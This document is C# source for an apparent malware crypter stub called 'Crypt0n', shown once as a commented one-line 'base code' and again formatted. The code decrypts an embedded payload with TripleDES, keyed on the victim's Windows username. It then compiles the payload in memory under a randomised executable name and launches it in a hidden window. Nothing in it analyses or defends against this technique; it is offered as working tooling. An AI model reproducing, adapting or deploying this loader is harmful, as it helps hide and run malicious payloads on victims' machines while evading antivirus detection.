//this is the launcher code. it decrypts the code inserted by the 'first launcher', then compiles & runs it
//http://www.dijksterhuis.org/encrypting-decrypting-string/

//below (commented) is the current base code. every time a major addition is made to Crypt0n, i (or someone else) will update the base code

//using System;using System.Text;using System.Security.Cryptography;using Microsoft.CSharp;using System.Diagnostics;using System.Runtime.InteropServices;using System.Management;using System.Threading;using System.CodeDom.Compiler;using System.Net;using System.IO;namespace Crypt0n{    class MainClass      {        public static void Main(string[] args)           {            string Code = "AnonWareEncrypted";            string Password = Environment.UserName.ToString();            string DecryptedCode = DecryptString(Code, Password);             CSharpCodeProvider myCodeProvider = new CSharpCodeProvider();             ICodeCompiler myCodeCompiler = myCodeProvider.CreateCompiler();             String[] referenceAssemblies = { "System.dll", "Microsoft.CSharp.dll", "System.Core.dll", "System.Data.dll", "System.Data.DataSetExtensions.dll", "System.Deployment.dll", "System.Xml.dll", "System.Xml.Linq.dll" };            string password123 = GetPassword();            string myAssemblyName = password123 + ".exe";            CompilerParameters myCompilerParameters = new CompilerParameters(referenceAssemblies, myAssemblyName);            myCompilerParameters.GenerateExecutable = true;              myCompilerParameters.GenerateInMemory = true;                CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, DecryptedCode);            Process cmd = new Process();            cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;            cmd.StartInfo.FileName = myAssemblyName;            cmd.Start();        }        public static string GetPassword()            {            StringBuilder builder = new StringBuilder();                builder.Append(RandomString(4, true));             builder.Append(RandomNumber(1000, 9999));             builder.Append(RandomString(2, false));              return builder.ToString();          }                private static int RandomNumber(int min, int max)            {             Random random = new Random();                 return random.Next(min, max);           }        private static string RandomString(int size, bool lowerCase)        {            StringBuilder builder = new StringBuilder();            Random random = new Random();            char ch;            for (int i = 0; i < size; i++)            {                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));                builder.Append(ch);            }            if (lowerCase)            {                return builder.ToString().ToLower(); } else {                return builder.ToString();            }        }        public static string DecryptString(string Message, string Passphrase)               {            byte[] Results;               System.Text.UTF8Encoding UTF8 = new System.Text.UTF8Encoding();               MD5CryptoServiceProvider HashProvider = new MD5CryptoServiceProvider();              byte[] TDESKey = HashProvider.ComputeHash(UTF8.GetBytes(Passphrase));               TripleDESCryptoServiceProvider TDESAlgorithm = new TripleDESCryptoServiceProvider();                 TDESAlgorithm.Key = TDESKey;                TDESAlgorithm.Mode = CipherMode.ECB;                 TDESAlgorithm.Padding = PaddingMode.PKCS7;               byte[] DataToDecrypt = Convert.FromBase64String(Message);                try               {                ICryptoTransform Decryptor = TDESAlgorithm.CreateDecryptor();                Results = Decryptor.TransformFinalBlock(DataToDecrypt, 0, DataToDecrypt.Length);                   }               finally               {                    TDESAlgorithm.Clear();                    HashProvider.Clear();              }             return UTF8.GetString(Results);           }    }}

using System;
using System.Text;
using System.Security.Cryptography;
using Microsoft.CSharp;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Management;
using System.Threading;
using System.CodeDom.Compiler;
using System.Net;
using System.IO;
namespace Crypt0n
{
    class MainClass  
    {
        public static void Main(string[] args)   
        {
            string Code = "AnonWareEncrypted";
            string Password = Environment.UserName.ToString();
            string DecryptedCode = DecryptString(Code, Password); 
            CSharpCodeProvider myCodeProvider = new CSharpCodeProvider(); 
            ICodeCompiler myCodeCompiler = myCodeProvider.CreateCompiler(); 
            String[] referenceAssemblies = { "System.dll", "Microsoft.CSharp.dll", "System.Core.dll", "System.Data.dll", "System.Data.DataSetExtensions.dll", "System.Deployment.dll", "System.Xml.dll", "System.Xml.Linq.dll" };
            string password123 = GetPassword();
            string myAssemblyName = password123 + ".exe";
            CompilerParameters myCompilerParameters = new CompilerParameters(referenceAssemblies, myAssemblyName);
            myCompilerParameters.GenerateExecutable = true;  
            myCompilerParameters.GenerateInMemory = true;    
            CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, DecryptedCode);
            Process cmd = new Process();
            cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            cmd.StartInfo.FileName = myAssemblyName;
            cmd.Start();
        }
        public static string GetPassword()    
        {
            StringBuilder builder = new StringBuilder();    
            builder.Append(RandomString(4, true)); 
            builder.Append(RandomNumber(1000, 9999)); 
            builder.Append(RandomString(2, false));  
            return builder.ToString();  
        }        
        private static int RandomNumber(int min, int max)    
        { 
            Random random = new Random();     
            return random.Next(min, max);   
        }
        private static string RandomString(int size, bool lowerCase)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            if (lowerCase)
            {
                return builder.ToString().ToLower();
            }
            else
            {
                return builder.ToString();
            }
        }
        public static string DecryptString(string Message, string Passphrase)       
        {
            byte[] Results;   
            System.Text.UTF8Encoding UTF8 = new System.Text.UTF8Encoding();   
            MD5CryptoServiceProvider HashProvider = new MD5CryptoServiceProvider();  
            byte[] TDESKey = HashProvider.ComputeHash(UTF8.GetBytes(Passphrase));   
            TripleDESCryptoServiceProvider TDESAlgorithm = new TripleDESCryptoServiceProvider();     
            TDESAlgorithm.Key = TDESKey;    
            TDESAlgorithm.Mode = CipherMode.ECB;     
            TDESAlgorithm.Padding = PaddingMode.PKCS7;   
            byte[] DataToDecrypt = Convert.FromBase64String(Message);    
            try   
            {
                ICryptoTransform Decryptor = TDESAlgorithm.CreateDecryptor();
                Results = Decryptor.TransformFinalBlock(DataToDecrypt, 0, DataToDecrypt.Length);       
            }   
            finally   
            {    
                TDESAlgorithm.Clear();    
                HashProvider.Clear();  
            } 
            return UTF8.GetString(Results);   
        }
    }
}